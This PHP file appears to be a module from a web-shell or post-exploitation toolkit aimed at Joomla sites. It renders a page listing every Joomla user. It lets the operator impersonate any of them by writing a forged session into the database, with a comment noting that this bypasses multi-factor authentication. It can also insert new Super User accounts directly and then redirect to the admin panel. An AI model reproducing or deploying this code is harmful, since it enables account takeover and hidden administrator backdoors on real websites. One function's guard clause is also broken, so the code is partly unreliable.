<?php

// section.constants
$IMPERSONATE_JOOMLA_USER = "__FEAT_IMPERSONATE_JOOMLA_USER__";
// section.constants.end

// section.functions
/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function __PREFIX__makeJoomlaImpersonatePage(&$page_content, $features, $page, $css) {
    $feature = array_values(array_filter($features, function ($feature) use ($page) {
        return $feature["op"] === $page;
    }));

    $users = __PREFIX__getJoomlaUsers();

    $page_content = __PREFIX__makePage(
        $features,
        $css,
        $page,
        [__PREFIX__makePageHeader(
            $feature[0]["title"],
            $feature[0]["description"]
        ), __PREFIX__makeTable(
            "Users",
            "Joomla users to impersonate",
            $users,
            ["id"       => "Id", "username" => "Username", "email"    => "Email", "title"    => "Role", "actions"  => "Actions"],
            "
                        <dialog id='create-joomla-user' class='p-4 rounded w-1/3'>" .
            __PREFIX__makeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                ["<div class='flex items-center justify-between'>
                                        <h3 class='text-lg font-semibold text-zinc-800'>Create Joomla user</h3>
                                        <button onclick='document.getElementById(\"create-joomla-user\").close(); document.getElementById(\"create-joomla-user\").classList.remove(\"flex\")' 
                                            class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                            &times;
                                        </button>
                                    </div>", __PREFIX__makeInput(
                    "text",
                    "Username",
                    "__PARAM_2__",
                    "admin",
                    "Username of the user to create.",
                    true
                ), __PREFIX__makeInput(
                    "text",
                    "Email",
                    "__PARAM_3__",
                    "admin@example.com",
                    "Email of the user to create.",
                    true
                ), __PREFIX__makeInput(
                    "password",
                    "Password",
                    "__PARAM_4__",
                    "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                    "Password of the user to create.",
                    true
                )],
                "post",
                "Create user",
                "flex flex-col gap-y-6 mx-auto w-full"
            )
            . "
                        </dialog>
                        <button onclick='document.getElementById(\"create-joomla-user\").showModal()' 
                            class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                                hover:bg-zinc-700 transition-all duration-300'>
                            Create user
                        </button>"
        )]
    );
}

/**
 * Create a Joomla user table row
 *
 * @param $data array{id: int, username: string, email: string, title: string} The data of the Joomla user
 *
 * @return array{id: int, username: string, email: string, title: string, actions: string} The Joomla user table row
 */
function __PREFIX__makeJoomlaUserTableRow($data) {
    global $IMPERSONATE_JOOMLA_USER;
    return array_merge(
        $data,
        ["actions" => __PREFIX__makeForm(
            $IMPERSONATE_JOOMLA_USER,
            $_SERVER["REQUEST_URI"],
            [__PREFIX__makeInput(
                "hidden",
                "Username",
                "__PARAM_1__",
                "",
                "Username of the user to impersonate.",
                true,
                null,
                htmlentities($data["username"])
            )],
            "post",
            "Impersonate",
            "flex flex-col max-w-xl mb-0"
        )]
    );
}

/**
 * Get the list of Joomla users
 *
 * @return array{id: int, username: string, email: string, title: string}[] List of Joomla users
 */
function __PREFIX__getJoomlaUsers() {
    if(!class_exists("Joomla\CMS\Factory")) {
        return [];
    }

    // inject joomla dependencies
    $container = \Joomla\CMS\Factory::getContainer();
    $db        = $container->get("Joomla\Database\DatabaseInterface");

    // create a new query object to retrieve user details along with group names
    $query = $db->getQuery(true);

    // build the query to retrieve user details and group names
    $query->select(['u.id', 'u.username', 'u.email', 'g.title']);
    $query->from($db->quoteName('#__users', 'u'));
    $query->leftJoin($db->quoteName('#__user_usergroup_map', 'm') . ' ON u.id = m.user_id');
    $query->leftJoin($db->quoteName('#__usergroups', 'g') . ' ON m.group_id = g.id');

    // set the query conditions to retrieve only activated users:
    // $query->where('u.block = 0');

    // execute the query
    $db->setQuery($query);

    return array_map(
        "__PREFIX__makeJoomlaUserTableRow",
        $db->loadAssocList()
    );
}

/**
 * Handle the redirect of Joomla to the administration panel
 *
 * @return void
 */
function __PREFIX__redirectJoomlaToAdminPanel() {
    if(!class_exists("JUri"))

    // Get the base URL of the Joomla site
    $baseUrl = JUri::base();

    // Construct the URL to the administration panel
    $adminUrl = $baseUrl . '../../../administrator/index.php';

    // Redirect to the administration panel
    JFactory::getApplication()
        ->redirect($adminUrl);
}

/**
 * Impersonate a Joomla user given a username
 *
 * @param $username string The username of the user to impersonate
 *
 * @return void
 */
function __PREFIX__impersonateJoomlaUser($username) {
    if(!class_exists("Joomla\CMS\Factory") || !class_exists("Joomla\Registry\Registry")){
        return;
    }
    // inject joomla dependencies
    $container = \Joomla\CMS\Factory::getContainer();
    /**
     * @var \Joomla\Database\DatabaseDriver $db
     */
    $db = $container->get("Joomla\Database\DatabaseInterface");

    // Get the user ID by username
    $query = $db->getQuery(true)
        ->select('id')
        ->from('#__users')
        ->where('username = :username')
        ->bind(':username', $username);

    $db->setQuery($query);
    $result = $db->loadResult();

    // Get the user object by id
    $user = $container->get("Joomla\CMS\User\UserFactoryInterface")
        ->loadUserById($result);

    // create a new registry object to store the session data
    $registry = new \Joomla\Registry\Registry();

    // the registry must contain a session object (stdClass)
    $session               = new \stdClass();
    $session->token        = session_id();
    $session->counter      = 5;
    $session->timer        = new \stdClass();
    $session->timer->start = time();
    $session->timer->now   = time();
    $session->timer->last  = time() + 60 * 60 * 24; // 24 hours
    // add the session object to the registry
    $registry->set("session", $session);

    // the registry must contain another registry object (i don't know why yet...)
    $internal_registry = new \Joomla\Registry\Registry();
    $registry->set("registry", $internal_registry);

    // the registry must contain a user object (a full user object directly retrieved from the database)
    $registry->set("user", $user);

    // if the user has MFA enabled, we need to bypass it, this should do the trick
    $mfa_bypass              = new \stdClass();
    $mfa_bypass->mfa_checked = 1;
    $registry->set("com_users", $mfa_bypass);

    // serialize the registry object and encode it in base64
    $serializable_session = base64_encode(serialize($registry));
    // then serialized the previous object and prepend it with the "joomla|" prefix
    $serialized_session = "joomla|" . serialize($serializable_session);

    // update the session data in the database
    $client_id = 1;
    $guest     = 0;
    $query     = $db->getQuery(true)
        ->update('#__session')
        ->set('data = :data')
        ->set('client_id = :client_id')
        ->set('guest = :guest')
        ->set('time = :time')
        ->set('userid = :uid')
        ->where('session_id = :session_id')
        ->bind(':data', $serialized_session)
        ->bind(':time', $session->timer->now)
        ->bind(':uid', $user->id)
        ->bind(':client_id', $client_id)
        ->bind(':guest', $guest)
        ->bind(":session_id", $session->token);
    $db->setQuery($query);
    $db->execute();

    // redirect to the admin panel (if located at the default path)
    __PREFIX__redirectJoomlaToAdminPanel();
}

/**
 * Add a Joomla super user
 *
 * @param $username string The username of the super user
 * @param $email string The email of the super user
 * @param $password string The password of the super user
 *
 * @return void
 */
function __PREFIX__addJoomlaSuperUser($username, $email, $password) {
    if(!class_exists("Joomla\CMS\Factory") || !class_exists("JUserHelper")){
        return;
    }

    // inject joomla dependencies
    $container = \Joomla\CMS\Factory::getContainer();
    /**
     * @var \Joomla\Database\DatabaseDriver $db
     */
    $db = $container->get("Joomla\Database\DatabaseInterface");

    // Query to retrieve the group ID for Super Users
    $query = $db->getQuery(true)
        ->select($db->quoteName('id'))
        ->from($db->quoteName('#__usergroups'))
        ->where($db->quoteName('title') . ' = ' . $db->quote('Super Users'));

    // Execute the query
    $db->setQuery($query);
    $groupId = $db->loadResult();

    // hash the password
    $password = JUserHelper::hashPassword($password);

    // Insert the user into the #__users table
    $query = $db->getQuery(true)
        ->insert($db->quoteName('#__users'))
        ->columns(
            [$db->quoteName('name'), $db->quoteName('username'), $db->quoteName('email'), $db->quoteName('password'), $db->quoteName('params'), $db->quoteName('registerDate'), $db->quoteName('lastvisitDate'), $db->quoteName('lastResetTime')]
        )
        ->values(
            $db->quote($username) .
            ', ' .
            $db->quote($username) .
            ', ' .
            $db->quote($email) .
            ', ' .
            $db->quote($password) .
            ', "", NOW(), NOW(), NOW()'
        );
    $db->setQuery($query);
    $db->execute();

    // Get the user ID of the newly inserted user
    $userId = $db->insertid();

    // Insert user-group mapping into #__user_usergroup_map table
    $query = $db->getQuery(true)
        ->insert($db->quoteName('#__user_usergroup_map'))
        ->columns([$db->quoteName('user_id'), $db->quoteName('group_id')])
        ->values($userId . ', ' . $groupId);
    $db->setQuery($query);
    $db->execute();
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__handleJoomlaImpersonate($operation, $features) {
    if (!empty($_POST["__PARAM_1__"])) {
        __PREFIX__impersonateJoomlaUser($_POST["__PARAM_1__"]);
    }
    elseif (!empty($_POST["__PARAM_2__"]) &&
            !empty($_POST["__PARAM_3__"]) &&
            !empty($_POST["__PARAM_4__"])) {
        __PREFIX__addJoomlaSuperUser($_POST["__PARAM_2__"], $_POST["__PARAM_3__"], $_POST["__PARAM_4__"]);

        header(
            "Location: " .
            $_SERVER["REQUEST_URI"],
            true,
            301
        );
        die;
    }
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function __PREFIX__joomlaImpersonateHooksIsolatedOps(&$isolated_ops) {
    global $IMPERSONATE_JOOMLA_USER;

    $isolated_ops[] = $IMPERSONATE_JOOMLA_USER;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__joomlaImpersonateHooksFeatures(&$features) {
    global $IMPERSONATE_JOOMLA_USER;

    $features[] = ["title"       => "Impersonate Joomla user", "description" => "Impersonate a Joomla user by changing the current session.", "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>', "op"          => $IMPERSONATE_JOOMLA_USER];
}

// section.functions.end

// section.hooks
add_hook("isolated_ops", "__PREFIX__joomlaImpersonateHooksIsolatedOps");
add_hook("features", "__PREFIX__joomlaImpersonateHooksFeatures");
add_named_hook("GET_page", $IMPERSONATE_JOOMLA_USER, "__PREFIX__makeJoomlaImpersonatePage");
add_named_hook("POST_operation", $IMPERSONATE_JOOMLA_USER, "__PREFIX__handleJoomlaImpersonate");
// section.hooks.end